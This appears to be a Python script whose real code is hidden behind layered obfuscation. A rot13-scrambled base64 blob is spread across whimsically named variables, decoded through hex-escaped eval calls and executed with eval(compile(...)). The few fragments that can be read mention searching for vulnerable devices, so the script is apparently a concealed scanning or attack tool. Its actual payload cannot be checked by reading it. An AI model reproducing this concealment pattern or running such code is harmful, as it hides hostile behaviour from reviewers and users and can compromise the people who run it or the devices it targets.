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'
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))